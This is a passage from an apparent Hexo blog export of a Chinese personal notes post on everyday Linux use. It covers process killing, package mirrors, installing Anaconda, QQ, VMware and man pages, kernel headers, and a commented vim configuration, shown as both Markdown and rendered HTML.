//关闭蓝牙配适器\n```\n\n### 关闭进程\n\n- 有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程\n- kill -9 进程IP    //可利用htop命令查看进程IP\n- 若没有htop，可下载\n\n```\nsudo apt install htop\n```\n\n\n\n### 卸载 IntelliJ IDEA(类似卸载可参考)\n\n1. 寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载\n2. 若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除\n3. 可能会存在开始菜单栏里依然有图标显示的问题，\n\n```\ncd ~/.local/share/applications\n```\n\n4. 之后在applications文件夹里找到相对应的配置文件删除即可\n\n\n\n\n\n### linux换源\n\n- 进入目录  /etc/apt/\n- sudo vim source.list\n- 上网寻找适合自己的源\n\n\n\n### 关于Anaconda的安装\n\n- 在清华镜像站下载Anaconda\n\n- 安装后修改环境变量\n\n  - sudo vim /etc/profile\n\n  - 向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH\n\n       \t\t\t\t\t\t%%blacksheep为用户名，应选择自己的路\t\t\t\t\t\t\t径配置环境变量\n\n- 安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响\n\n- 更换anaconda的源，以清华源举例：\n\n  - sudo vim ~/.condarc\n\n  - 向里面写入：\n\n    \n\n    ```\n    channels:\n    https://mirrors.ustc.edu.cn/anaconda/pkgs/main/\n    https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/\n    https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n    defaults\n    show_channel_urls: true\n    ```\n  \n  \n\n\n### 关于qq的安装问题\n\n- 在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了\n- 关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决\n\n```\napt-get install xfonts-intl-chinese\napt-get install ttf-wqy-microhei\n```\n\n- 关于QQ用wine装好后找不到的问题\n  + wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出\n  + 输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin\n  + 你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序\n  + 为了方便，可以把QQ/Bin 放到home文件下\n\n\n\n### 关于输入法的问题\n\n- 搜狗输入法兼容性不咋地，反正安装了很多遍都不行\n- 谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心\n- 推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了\n\n### wps字体问题\n\n- 使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体\n- 将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令\n\n```\nsudo fc-cache -fv     //识别字体库\n\nfc-list :lang=zh-cn | sort    //确认是否安装\n```\n\n\n\n\n\n### 关于vmware 虚拟机安装\n\n1. 官网下载虚拟机最新版本\n2. chmod -x 下载的文件\n3. sudo bash 下载的文件\n4. 之后就可以在电脑中找到虚拟机，并进行下一步的安装操作\n\n### linux-vmware升级问题\n\n[解决 linux升级 导致VMware启动出现\"before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel\" 而无法卸载](https://www.cnblogs.com/wjshan0808/p/4110495.html)\n\n```\n# vmware-uninstall \nYou have gotten this message because you are either downgrading VMware\nWorkstation, Player, or VIX, or because you attempted to run either\nvmware-uninstall or vmware-uninstall-vix.\n\nIf you are downgrading, please uninstall all newer versions first, then\ninstall again.\n\nThe vmware-uninstall* scripts have been deprecated.  Instead, please use\nthe vmware-installer.\n\nLong form:\n      vmware-installer --uninstall-product PRODUCT\nShort form:\n      vmware-installer -u PRODUCT\n\nWhere PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.\n\nFor a list of which products are installed, you may run:\n      vmware-installer --list-products\nor:\n      vmware-installer -l\n\n\n# vmware-installer -l\nProduct Name         Product Version     \n==================== ====================\nvmware-workstation   10.0.4.2249910      \n# vmware-installer -u vmware-workstation\n```\n\n\n\n### man 中文手册下载\n\n1. Debian / Ubuntu安装\n\n```\nsudo apt update\nsudo apt install manpages-zh\n```\n\n2. Arch Linux:\n\n```\npacman -Syu\npacman -S man-pages-zh_cn man-pages-zh_tw\n```\n\n3. Red Hat / CentOS:\n\n```\nyum update\nyum install man-pages-zh-CN\n```\n\n4. Fedora:\n\n```\ndnf update\ndnf install man-pages-zh-CN\n```\n\n\n\n### kali内核更新安装\n\n1. 查看内核版本\n\n```\nuname -r\n```\n\n2. 检查linux是否安装对应的头文件\n\n```\nsudo apt-cache search linux-headers\n```\n\n3. 安装更新头文件\n\n```\nsudo apt install linux-headers-$(uname -r)\n```\n\n4. 内核头文件检测是否安装\n\n```\nsudo dpkg-query -s linux-headers-`uname -r`\n```\n\n\n\n### vim命令\n\n1. :set number 显示行号\n2. :set 取消行号\n3. xG:跳转到指定的第x行，G移动到文件末尾行\n4. dd ：剪切一行， yy：复制一行\n5. D：剪切一个字符，y：复制一个字符\n6. p：粘贴\n7. dxw：删除光标右边x个字符\n8. dxh：删除光标左边x个字符\n9. :x 删除一个字符\n10. /string :查找字符 n:向上查找，N：向下查找\n11. :范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换\n\n- vim规则总结\n\n（1）一般是操作字符+被操作的量\n\n（2）$ 为结尾， 0 为开头\n\n- vim简单配置：\n\n  \n\n  ```c\n  \"===================\n  \"适合自己用的vimrc配置文件\n  \"===================\n  \n  \"设置编码\n  set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936\n  set termencoding=utf-8\n  set encoding=utf-8\n  \n  \"保存.vimrc文件时自动重启加载，即让此文件立即生效\n  autocmd BufWritePost $MYVIMRC source $MYVIMRC\n  \n  \"语法高亮\n  syntax on\n  \n  \"设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容\n  \"set ruler\n  \n  \"设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]\n  \"%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.\n  \"%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.\n  set statusline=%F%r\\ [HEX=%B][%l,%v,%P]\\ %{strftime(\\\"%H:%M\\\")}\n  \n  \"显示行号\n  set nu \"等同于 set number\n  \n  \"突出显示当前行\n  set cursorline \"等同于 set cul\n  \n  \"突出显示当前列\n  set cursorcolumn \"等同于 set cuc\n  \n  \"共享剪贴板  \n  set clipboard+=unnamed \n  \n  \"从不备份  \n  set nobackup\n  \n  \"自动保存\n  set autowrite\n  \n  \"隐藏工具栏\n  \"set guioptions-=T\n  \"隐藏菜单栏\n  \"set guioptions-=m\n  \n  \"高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.\n  \"set hlsearch\n  \n  \"光标立刻跳转到搜索到内容\n  \"set incsearch\n  \n  \"搜索到最后匹配的位置后,再次搜索不回到第一个匹配处\n  \"set nowrapscan\n  \n  \"去掉输入错误时的提示声音\n  set noeb\n  \n  \" 默认按下Esc后,需要等待1秒才生效,设置Esc超时时间为100ms,尽快生效\n  set ttimeout\n  set ttimeoutlen=100\n  \n  \"在处理未保存或只读文件的时候，弹出确认\n  set confirm\n  \n  \"让Backspace键可以往前删除字符.\n  \"Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,\n  \"可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,\n  \"可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.\n  \"使回格键（backspace）正常处理indent, eol, start等\n  set backspace=indent,eol,start\n  \n  \"允许backspace和光标键跨越行边界\n  \"set whichwrap+=<,>,h,l\n  \n  \"去掉有关vi一致性模式,避免操作习惯上的局限.\n  set nocompatible\n  \n  \"FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置\n  \"全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.\n  \"但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现\n  \"可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.\n  \" mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a\n  set mouse=n\n  \"set selection=exclusive\n  \"set selectmode=mouse,key\n  \n  \"高亮显示括号匹配\n  set showmatch\n  \n  \"设置Tab长度为4空格\n  set tabstop=4\n  \"设置自动缩进长度为4空格\n  set shiftwidth=4\n  \"自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置\n  \"set autoindent\n  \"不要用空格代替制表符\n  set noexpandtab\n  \"输入tab制表符时，自动替换成空格\n  \"set expandtab\n  \"设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.\n  \"softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.\n  \"set softtabstop=4\n  \n  \n  \"显示空格和tab键\n  set listchars=tab:>-,trail:-\n  \n  \"1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名\n  set laststatus=2\n  \n  \"自动补全\n  :inoremap ( ()<ESC>i\n  :inoremap ) <c-r>=ClosePair(')')<CR>\n  :inoremap { {<CR>}<ESC>O\n  :inoremap } <c-r>=ClosePair('}')<CR>\n  :inoremap [ []<ESC>i\n  :inoremap ] <c-r>=ClosePair(']')<CR>\n  :inoremap \" \"\"<ESC>i\n  :inoremap ' ''<ESC>i\n  function! ClosePair(char)\n      if getline('.')[col('.') - 1] == a:char\n          return \"\\<Right>\"\n      else\n          return a:char\n      endif\n  endfunction \n  \"打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文\n  filetype plugin indent on\n  \" 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过\n  \" CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.\n  \" 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较\n  \" 麻烦,不做设置,保持默认设置,vim默认没有设置longest.\n  \"set completeopt=longest,menu \"启用这句才会开启自动补全\n  \n  \n  \"=============显示中文帮助\n  if version >= 603\n      set helplang=cn\n      set encoding=utf-8\n  endif\n  \n  \"=============新建.c,.h,.sh,.java文件，自动插入文件头 \n  autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec \":call SetTitle()\" \n  \"\"定义函数SetTitle，自动插入文件头 \n  func SetTitle() \n      \"如果文件类型为.sh文件 \n      if &filetype == 'sh' \n          call setline(1,\"\\############################\") \n          call append(line(\".\"), \"\\# File Name: \".expand(\"%\")) \n          call append(line(\".\")+1, \"\\# Author: Li Ziqiang\") \n          call append(line(\".\")+2, \"\\# mail: 2296557984@qq.com\") \n          call append(line(\".\")+3, \"\\# Created Time: \".strftime(\"%c\"))\n          call append(line(\".\")+4, \"\\############################\") \n          call append(line(\".\")+5, \"\\#!/bin/bash\") \n          call append(line(\".\")+6, \"\") \n      else \n          call setline(1, \"/******************************\") \n          call append(line(\".\"), \"    > File Name: \".expand(\"%\")) \n          call append(line(\".\")+1, \"    > Author:Li Ziqiang\") \n          call append(line(\".\")+2, \"    > Mail: 2296557984@qq.com \") \n          call append(line(\".\")+3, \"    > Created Time: \".strftime(\"%c\")) \n          call append(line(\".\")+4, \" *****************************/\") \n          call append(line(\".\")+5, \"\")\n      endif\n  \n      \"新建文件后，自动定位到文件末尾\n      autocmd BufNewFile * normal G\n  endfunc \n  \n  ```\n\n  ","slug":"Linux基础","published":1,"updated":"2021-03-24T04:15:03.293Z","layout":"post","photos":[],"link":"","_id":"ckq3bl41x0007dsvt60mz5ck4","content":"<p><a href=\"https://book.apeland.cn/details/189/\">本笔记的友情链接</a></p>\n<h2 id=\"常用目录介绍\"><a href=\"#常用目录介绍\" class=\"headerlink\" title=\"常用目录介绍\"></a>常用目录介绍</h2><ol>\n<li>boot    存放启动文件</li>\n<li>dev     存放设备文件</li>\n<li>etc     存放配置文件</li>\n<li>home    普通用户家目录，以/home/$username的方式存放</li>\n<li>media   移动存储自动挂载目录,以 /media/$device_name的方式来存放</li>\n<li>mnt     手动挂载目录</li>\n<li>opt     三方软件安装目录</li>\n<li>proc    内存系统文件</li>\n<li>root    管理员家目录</li>\n<li>run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成</li>\n<li>srv     服务相关数据</li>\n<li>sys     系统文件</li>\n<li>tmp     临时文件夹</li>\n<li>usr     存放库文件、文档、命令、用户数据等</li>\n<li>var     日志存放lib     库文件<span id=\"more\"></span></li>\n</ol>\n<ul>\n<li>-echo相当于python中的print，即输出、打印的意思</li>\n</ul>\n<h2 id=\"linux基本命令\"><a href=\"#linux基本命令\" class=\"headerlink\" title=\"linux基本命令\"></a>linux基本命令</h2><h3 id=\"命令-命令选项-参数\"><a href=\"#命令-命令选项-参数\" class=\"headerlink\" title=\"命令[命令选项][参数]\"></a>命令[命令选项][参数]</h3><p>​    {必选项}， [可选项]</p>\n<p>1）清屏命令：clear      快捷键  ctrl+l<br>2）帮助命令：man<br>3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】<br>4）列出当前目录内容命令：ls   [-a -l -d ] 【list】<br>5）显示主机名：hostname<br>6）显示日期时间：date [-s %F]<br>7）显示日历：cal<br>8）计算器：bc<br>9）重启命令：reboot     shutdown -r      init 6<br>10）注销命令：logout<br>11）关机命令：halt      shutdown -h         init 0<br>12) 显示当前操作系统和机器的信息: uname<br>13) 显示当前路径: pwd 【定位自己的位置】</p>\n<p>-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主<br>-命令选项写全称时，前面加 — —</p>\n<ul>\n<li><p>从命令行启动图形界面的默认图片查看器</p>\n<p>​    运行命令：xdg-open filename.png</p>\n</li>\n<li><p>在命令行打开一个图片:</p>\n<ol>\n<li><p>apt install fim</p>\n</li>\n<li><p>fim filename.png</p>\n<ul>\n<li><p>fim是fbi的升级版</p>\n<p><a href=\"http://www.itpro.net.cn/2019/12/linux\">有关于fim的操作链接</a></p>\n</li>\n</ul>\n</li>\n</ol>\n</li>\n<li><p>apt 与apt-get 的区别：apt-get 是 apt 的子集</p>\n</li>\n<li><p>更新安装包：apt upgrade</p>\n</li>\n</ul>\n<h3 id=\"安装内核头文件\"><a href=\"#安装内核头文件\" class=\"headerlink\" title=\"安装内核头文件\"></a>安装内核头文件</h3><ul>\n<li>输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可</li>\n</ul>\n<h3 id=\"安装照相机\"><a href=\"#安装照相机\" class=\"headerlink\" title=\"安装照相机\"></a>安装照相机</h3><pre><code>sudo apt install cheese</code></pre><h3 id=\"u盘修改只读模式\"><a href=\"#u盘修改只读模式\" class=\"headerlink\" title=\"u盘修改只读模式\"></a>u盘修改只读模式</h3><ol>\n<li>查看U盘分区</li>\n</ol>\n<pre><code>sudo fdisk -l</code></pre><ol start=\"2\">\n<li>查看U盘的挂载点</li>\n</ol>\n<pre><code>df U盘分区</code></pre><ol start=\"3\">\n<li>卸载原挂载的U盘</li>\n<li>修复U盘的文件管理系统</li>\n</ol>\n<pre><code>sudo dosfsck -v -a [U盘分区]</code></pre><ol start=\"5\">\n<li>重新挂载</li>\n</ol>\n<h3 id=\"蓝牙\"><a href=\"#蓝牙\" class=\"headerlink\" title=\"蓝牙\"></a>蓝牙</h3><pre><code>sudo service bluetooth start  //打开蓝牙配适器\nsudo service bluetooth stop   //关闭蓝牙配适器</code></pre><h3 id=\"关闭进程\"><a href=\"#关闭进程\" class=\"headerlink\" title=\"关闭进程\"></a>关闭进程</h3><ul>\n<li>有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程</li>\n<li>kill -9 进程IP    //可利用htop命令查看进程IP</li>\n<li>若没有htop，可下载</li>\n</ul>\n<pre><code>sudo apt install htop</code></pre><h3 id=\"卸载-IntelliJ-IDEA-类似卸载可参考\"><a href=\"#卸载-IntelliJ-IDEA-类似卸载可参考\" class=\"headerlink\" title=\"卸载 IntelliJ IDEA(类似卸载可参考)\"></a>卸载 IntelliJ IDEA(类似卸载可参考)</h3><ol>\n<li>寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载</li>\n<li>若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除</li>\n<li>可能会存在开始菜单栏里依然有图标显示的问题，</li>\n</ol>\n<pre><code>cd ~/.local/share/applications</code></pre><ol start=\"4\">\n<li>之后在applications文件夹里找到相对应的配置文件删除即可</li>\n</ol>\n<h3 id=\"linux换源\"><a href=\"#linux换源\" class=\"headerlink\" title=\"linux换源\"></a>linux换源</h3><ul>\n<li>进入目录  /etc/apt/</li>\n<li>sudo vim source.list</li>\n<li>上网寻找适合自己的源</li>\n</ul>\n<h3 id=\"关于Anaconda的安装\"><a href=\"#关于Anaconda的安装\" class=\"headerlink\" title=\"关于Anaconda的安装\"></a>关于Anaconda的安装</h3><ul>\n<li><p>在清华镜像站下载Anaconda</p>\n</li>\n<li><p>安装后修改环境变量</p>\n<ul>\n<li><p>sudo vim /etc/profile</p>\n</li>\n<li><p>向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH</p>\n<pre><code>                       %%blacksheep为用户名，应选择自己的路                            径配置环境变量</code></pre></li>\n</ul>\n</li>\n<li><p>安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响</p>\n</li>\n<li><p>更换anaconda的源，以清华源举例：</p>\n<ul>\n<li><p>sudo vim ~/.condarc</p>\n</li>\n<li><p>向里面写入：</p>\n</li>\n</ul>\n</li>\n</ul>\n<pre><code>```\nchannels:\nhttps://mirrors.ustc.edu.cn/anaconda/pkgs/main/\nhttps://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/\nhttps://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\ndefaults\nshow_channel_urls: true\n```</code></pre><h3 id=\"关于qq的安装问题\"><a href=\"#关于qq的安装问题\" class=\"headerlink\" title=\"关于qq的安装问题\"></a>关于qq的安装问题</h3><ul>\n<li>在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了</li>\n<li>关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决</li>\n</ul>\n<pre><code>apt-get install xfonts-intl-chinese\napt-get install ttf-wqy-microhei</code></pre><ul>\n<li>关于QQ用wine装好后找不到的问题<ul>\n<li>wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出</li>\n<li>输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin</li>\n<li>你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序</li>\n<li>为了方便，可以把QQ/Bin 放到home文件下</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"关于输入法的问题\"><a href=\"#关于输入法的问题\" class=\"headerlink\" title=\"关于输入法的问题\"></a>关于输入法的问题</h3><ul>\n<li>搜狗输入法兼容性不咋地，反正安装了很多遍都不行</li>\n<li>谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心</li>\n<li>推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了</li>\n</ul>\n<h3 id=\"wps字体问题\"><a href=\"#wps字体问题\" class=\"headerlink\" title=\"wps字体问题\"></a>wps字体问题</h3><ul>\n<li>使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体</li>\n<li>将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令</li>\n</ul>\n<pre><code>sudo fc-cache -fv     //识别字体库\n\nfc-list :lang=zh-cn | sort    //确认是否安装</code></pre><h3 id=\"关于vmware-虚拟机安装\"><a href=\"#关于vmware-虚拟机安装\" class=\"headerlink\" title=\"关于vmware 虚拟机安装\"></a>关于vmware 虚拟机安装</h3><ol>\n<li>官网下载虚拟机最新版本</li>\n<li>chmod -x 下载的文件</li>\n<li>sudo bash 下载的文件</li>\n<li>之后就可以在电脑中找到虚拟机，并进行下一步的安装操作</li>\n</ol>\n<h3 id=\"linux-vmware升级问题\"><a href=\"#linux-vmware升级问题\" class=\"headerlink\" title=\"linux-vmware升级问题\"></a>linux-vmware升级问题</h3><p><a href=\"https://www.cnblogs.com/wjshan0808/p/4110495.html\">解决 linux升级 导致VMware启动出现”before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel” 而无法卸载</a></p>\n<pre><code># vmware-uninstall \nYou have gotten this message because you are either downgrading VMware\nWorkstation, Player, or VIX, or because you attempted to run either\nvmware-uninstall or vmware-uninstall-vix.\n\nIf you are downgrading, please uninstall all newer versions first, then\ninstall again.\n\nThe vmware-uninstall* scripts have been deprecated.  Instead, please use\nthe vmware-installer.\n\nLong form:\n      vmware-installer --uninstall-product PRODUCT\nShort form:\n      vmware-installer -u PRODUCT\n\nWhere PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.\n\nFor a list of which products are installed, you may run:\n      vmware-installer --list-products\nor:\n      vmware-installer -l\n\n\n# vmware-installer -l\nProduct Name         Product Version     \n==================== ====================\nvmware-workstation   10.0.4.2249910      \n# vmware-installer -u vmware-workstation</code></pre><h3 id=\"man-中文手册下载\"><a href=\"#man-中文手册下载\" class=\"headerlink\" title=\"man 中文手册下载\"></a>man 中文手册下载</h3><ol>\n<li>Debian / Ubuntu安装</li>\n</ol>\n<pre><code>sudo apt update\nsudo apt install manpages-zh</code></pre><ol start=\"2\">\n<li>Arch Linux:</li>\n</ol>\n<pre><code>pacman -Syu\npacman -S man-pages-zh_cn man-pages-zh_tw</code></pre><ol start=\"3\">\n<li>Red Hat / CentOS:</li>\n</ol>\n<pre><code>yum update\nyum install man-pages-zh-CN</code></pre><ol start=\"4\">\n<li>Fedora:</li>\n</ol>\n<pre><code>dnf update\ndnf install man-pages-zh-CN</code></pre><h3 id=\"kali内核更新安装\"><a href=\"#kali内核更新安装\" class=\"headerlink\" title=\"kali内核更新安装\"></a>kali内核更新安装</h3><ol>\n<li>查看内核版本</li>\n</ol>\n<pre><code>uname -r</code></pre><ol start=\"2\">\n<li>检查linux是否安装对应的头文件</li>\n</ol>\n<pre><code>sudo apt-cache search linux-headers</code></pre><ol start=\"3\">\n<li>安装更新头文件</li>\n</ol>\n<pre><code>sudo apt install linux-headers-$(uname -r)</code></pre><ol start=\"4\">\n<li>内核头文件检测是否安装</li>\n</ol>\n<pre><code>sudo dpkg-query -s linux-headers-`uname -r`</code></pre><h3 id=\"vim命令\"><a href=\"#vim命令\" class=\"headerlink\" title=\"vim命令\"></a>vim命令</h3><ol>\n<li>:set number 显示行号</li>\n<li>:set 取消行号</li>\n<li>xG:跳转到指定的第x行，G移动到文件末尾行</li>\n<li>dd ：剪切一行， yy：复制一行</li>\n<li>D：剪切一个字符，y：复制一个字符</li>\n<li>p：粘贴</li>\n<li>dxw：删除光标右边x个字符</li>\n<li>dxh：删除光标左边x个字符</li>\n<li>:x 删除一个字符</li>\n<li>/string :查找字符 n:向上查找，N：向下查找</li>\n<li>:范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换</li>\n</ol>\n<ul>\n<li>vim规则总结</li>\n</ul>\n<p>（1）一般是操作字符+被操作的量</p>\n<p>（2）$ 为结尾， 0 为开头</p>\n<ul>\n<li>vim简单配置：</li>\n</ul>\n<pre><code class=\"c\">  &quot;===================\n  &quot;适合自己用的vimrc配置文件\n  &quot;===================\n\n  &quot;设置编码\n  set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936\n  set termencoding=utf-8\n  set encoding=utf-8\n\n  &quot;保存.vimrc文件时自动重启加载，即让此文件立即生效\n  autocmd BufWritePost $MYVIMRC source $MYVIMRC\n\n  &quot;语法高亮\n  syntax on\n\n  &quot;设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容\n  &quot;set ruler\n\n  &quot;设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]\n  &quot;%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.\n  &quot;%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.\n  set statusline=%F%r\\ [HEX=%B][%l,%v,%P]\\ %&#123;strftime(\\&quot;%H:%M\\&quot;)&#125;\n\n  &quot;显示行号\n  set nu &quot;等同于 set number\n\n  &quot;突出显示当前行\n  set cursorline &quot;等同于 set cul\n\n  &quot;突出显示当前列\n  set cursorcolumn &quot;等同于 set cuc\n\n  &quot;共享剪贴板  \n  set clipboard+=unnamed \n\n  &quot;从不备份  \n  set nobackup\n\n  &quot;自动保存\n  set autowrite\n\n  &quot;隐藏工具栏\n  &quot;set guioptions-=T\n  &quot;隐藏菜单栏\n  &quot;set guioptions-=m\n\n  &quot;高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.\n  &quot;set hlsearch\n\n  &quot;光标立刻跳转到搜索到内容\n  &quot;set incsearch\n\n  &quot;搜索到最后匹配的位置后,再次搜索不回到第一个匹配处\n  &quot;set nowrapscan\n\n  &quot;去掉输入错误时的提示声音\n  set noeb\n\n  &quot; 默认按下Esc后,需要等待1秒才生效,设置Esc超时时间为100ms,尽快生效\n  set ttimeout\n  set ttimeoutlen=100\n\n  &quot;在处理未保存或只读文件的时候，弹出确认\n  set confirm\n\n  &quot;让Backspace键可以往前删除字符.\n  &quot;Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,\n  &quot;可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,\n  &quot;可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.\n  &quot;使回格键（backspace）正常处理indent, eol, start等\n  set backspace=indent,eol,start\n\n  &quot;允许backspace和光标键跨越行边界\n  &quot;set whichwrap+=&lt;,&gt;,h,l\n\n  &quot;去掉有关vi一致性模式,避免操作习惯上的局限.\n  set nocompatible\n\n  &quot;FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置\n  &quot;全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.\n  &quot;但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现\n  &quot;可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.\n  &quot; mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a\n  set mouse=n\n  &quot;set selection=exclusive\n  &quot;set selectmode=mouse,key\n\n  &quot;高亮显示括号匹配\n  set showmatch\n\n  &quot;设置Tab长度为4空格\n  set tabstop=4\n  &quot;设置自动缩进长度为4空格\n  set shiftwidth=4\n  &quot;自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置\n  &quot;set autoindent\n  &quot;不要用空格代替制表符\n  set noexpandtab\n  &quot;输入tab制表符时，自动替换成空格\n  &quot;set expandtab\n  &quot;设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.\n  &quot;softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.\n  &quot;set softtabstop=4\n\n\n  &quot;显示空格和tab键\n  set listchars=tab:&gt;-,trail:-\n\n  &quot;1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名\n  set laststatus=2\n\n  &quot;自动补全\n  :inoremap ( ()&lt;ESC&gt;i\n  :inoremap ) &lt;c-r&gt;=ClosePair(&#39;)&#39;)&lt;CR&gt;\n  :inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O\n  :inoremap &#125; &lt;c-r&gt;=ClosePair(&#39;&#125;&#39;)&lt;CR&gt;\n  :inoremap [ []&lt;ESC&gt;i\n  :inoremap ] &lt;c-r&gt;=ClosePair(&#39;]&#39;)&lt;CR&gt;\n  :inoremap &quot; &quot;&quot;&lt;ESC&gt;i\n  :inoremap &#39; &#39;&#39;&lt;ESC&gt;i\n  function! ClosePair(char)\n      if getline(&#39;.&#39;)[col(&#39;.&#39;) - 1] == a:char\n          return &quot;\\&lt;Right&gt;&quot;\n      else\n          return a:char\n      endif\n  endfunction \n  &quot;打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文\n  filetype plugin indent on\n  &quot; 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过\n  &quot; CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.\n  &quot; 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较\n  &quot; 麻烦,不做设置,保持默认设置,vim默认没有设置longest.\n  &quot;set completeopt=longest,menu &quot;启用这句才会开启自动补全\n\n\n  &quot;=============显示中文帮助\n  if version &gt;= 603\n      set helplang=cn\n      set encoding=utf-8\n  endif\n\n  &quot;=============新建.c,.h,.sh,.java文件，自动插入文件头 \n  autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec &quot;:call SetTitle()&quot; \n  &quot;&quot;定义函数SetTitle，自动插入文件头 \n  func SetTitle() \n      &quot;如果文件类型为.sh文件 \n      if &amp;filetype == &#39;sh&#39; \n          call setline(1,&quot;\\############################&quot;) \n          call 